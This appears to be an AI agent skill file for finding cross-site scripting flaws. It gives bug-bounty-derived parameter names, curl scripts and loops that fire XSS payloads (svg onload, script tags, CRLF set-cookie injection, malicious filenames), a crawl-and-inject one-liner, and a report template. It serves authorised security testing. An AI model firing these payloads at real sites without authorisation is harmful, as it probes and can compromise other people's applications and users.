---
description: Find XSS vulnerabilities in web applications. Use when testing for XSS issues.
---

# XSS Vulnerability Testing Tool

This tool identifies Cross-Site Scripting (XSS) vulnerabilities using patterns extracted from real bug bounty reports.

## High-Value Patterns

### Parameter Names
- `__zopim_widget_proxy` (Zopim chat widgets)
- `success_url`, `decline_url` (payment forms)
- `currency` (e-commerce)
- `cvo_sid1`, `typ` (tracking/analytics)
- `Format` (content formatting)
- `email[]` (array parameters)
- Form fields: `title`, `name`, `firstname`, `lastname`

### Endpoint Patterns
- `/paypage/initial` (payment processors)
- `/discussion/comment/` (forums)
- `/index.php/` (PHP path info)
- `/reports/custom/` (reporting dashboards)
- `/account/photo` (profile settings)
- `/updater/` (software updaters)
- Hash fragments: `#cvo_sid1=`

### File Upload Contexts
- Image uploads with HTML extension tricks
- Filename XSS in error messages
- Large file upload errors

## Testing Methodology

### 1. Parameter Discovery
```bash
# Test common XSS parameters
TARGETS=(
  "__zopim_widget_proxy"
  "success_url"
  "decline_url" 
  "currency"
  "cvo_sid1"
  "Format"
  "email[]"
  "title"
  "name"
)

for param in "${TARGETS[@]}"; do
  curl -s "https://target.com/endpoint?${param}=%3Csvg/onload=alert(1)%3E" \
    -H "User-Agent: Mozilla/5.0" | grep -i "svg/onload"
done
```

### 2. POST Parameter Testing
```bash
# Test POST parameters with XSS payloads
curl -X POST "https://target.com/form" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'email[]=<svg/onload=alert(1)>&Format=String&title="><img src=x onerror=alert(1)>' \
  -v | grep -i "svg\|img src\|onerror"
```

### 3. Path Info XSS Testing
```bash
# Test path info injection
curl -s "https://target.com/index.php/\"><script>alert(1)</script>" \
  -H "User-Agent: Mozilla/5.0" | grep -i "script.*alert"

# Test with URL encoding
curl -s "https://target.com/index.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E" \
  -H "User-Agent: Mozilla/5.0" | grep -i "script"
```

### 4. Fragment/Hash Testing
```bash
# Test hash fragment XSS (client-side)
echo "Visit: https://target.com/#?cvo_sid1=111\\u0026;typ=55577]%22)%3balert(1)%3b//"
```

### 5. File Upload Testing
```bash
# Create malicious filename
FILENAME="test\"><svg/onload=alert(1)>.jpg"
curl -X POST "https://target.com/upload" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@largefile.jpg;filename=${FILENAME}" \
  -v | grep -i "svg\|alert"
```

### 6. Header Injection Testing
```bash
# Test CRLF in headers leading to XSS
curl -s "https://target.com/data/%E5%98%8A%E5%98%8Dset-cookie%3A%20test%3Dtest" \
  -v 2>&1 | grep -i "set-cookie.*test"
```

### 7. JSON/API Context Testing
```bash
# Test JSON injection in APIs
curl -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"tag":"</textarea><script>alert(1)</script>","payload":"test"}' \
  | grep -i "script.*alert"
```

## Comprehensive Test Suite
```bash
#!/bin/bash
test_xss() {
  local target="$1"
  echo "Testing XSS on: $target"
  
  # Common XSS payloads
  PAYLOADS=(
    '"><svg/onload=alert(1)>'
    '"><img src=x onerror=alert(1)>'
    "javascript:alert(1)"
    "%22%3E%3Csvg/onload=alert(1)%3E"
    "</script><script>alert(1)</script>"
    "javascript%u003Aalert(1)"
    "[[5*5]]"  # Angular injection
  )
  
  # Test GET parameters
  for payload in "${PAYLOADS[@]}"; do
    curl -s "${target}?test=${payload}" -H "User-Agent: Mozilla/5.0" \
      | grep -i "svg\|img.*onerror\|script.*alert\|javascript:" && echo "POTENTIAL XSS FOUND"
  done
  
  # Test POST
  for payload in "${PAYLOADS[@]}"; do
    curl -X POST "$target" \
      -d "test=${payload}&email[]=${payload}&Format=String" \
      | grep -i "svg\|img.*onerror\|script.*alert" && echo "POTENTIAL POST XSS FOUND"
  done
}
```

## Severity Rating Table

| Context | Payload Type | Impact | Severity |
|---------|-------------|---------|----------|
| Admin Panel | Stored XSS | Account takeover | Critical |
| User Profile | Stored XSS | Session hijacking | High |
| Public Forum | Stored XSS | Mass exploitation | High |
| Payment Form | Reflected XSS | Financial fraud | High |
| Error Pages | Reflected XSS | Social engineering | Medium |
| File Upload | Filename XSS | Limited scope | Medium |
| Hash Fragment | DOM XSS | Click required | Low-Medium |

## False Positives to Ignore

1. **CSP-Protected Contexts**: If `Content-Security-Policy` header blocks `unsafe-inline`
2. **Encoded in Attributes**: `&lt;script&gt;` in HTML attributes without decode
3. **Inside Comments**: `<!-- <script>alert(1)</script> -->`
4. **Text Nodes Only**: Payload appears as plain text, not HTML
5. **Length Limitations**: Fields too short for meaningful exploitation
6. **Sandboxed Contexts**: iframe with `sandbox` attribute

```bash
# Check for CSP
curl -I "https://target.com" | grep -i "content-security-policy"

# Verify XSS execution context
curl -s "https://target.com/xss-endpoint" | grep -A5 -B5 "payload"
```

## Finding Report Template

```markdown
# XSS Vulnerability Report

## Summary
Cross-Site Scripting vulnerability in [endpoint/parameter] allowing [reflected/stored/DOM] XSS execution.

## Vulnerability Details
- **URL**: https://target.com/vulnerable-endpoint
- **Parameter**: parameter_name
- **Type**: [Reflected/Stored/DOM]
- **Payload**: `"><svg/onload=alert(document.domain)>`

## Steps to Reproduce
1. Navigate to https://target.com/vulnerable-endpoint
2. Submit payload: `"><svg/onload=alert(1)>`
3. Observe JavaScript execution

## Proof of Concept
```bash
curl -X POST "https://target.com/endpoint" \
  -d "param="><svg/onload=alert(1)>" \
  | grep "svg/onload"
```

## Impact
- Session hijacking via cookie theft
- Account takeover through CSRF
- Phishing attacks via DOM manipulation
- Administrative access if admin user affected

## Remediation
1. Implement proper output encoding based on context
2. Use Content Security Policy with `'unsafe-inline'` disabled
3. Validate and sanitize all user inputs
4. Apply principle of least privilege
```

## Quick XSS Discovery Commands

```bash
# Find XSS-prone parameters in responses
curl -s "https://target.com" | grep -i "param\|input\|name=" | grep -o 'name="[^"]*"'

# Test common injection points
echo "https://target.com" | hakrawler | grep -E "\?" | head -20 | while read url; do
  curl -s "${url}&xss=%3Csvg/onload=alert(1)%3E" | grep -i "svg/onload" && echo "XSS: $url"
done

# Check for reflected parameters
curl -s "https://target.com/search?q=UNIQUE123" | grep "UNIQUE123"
```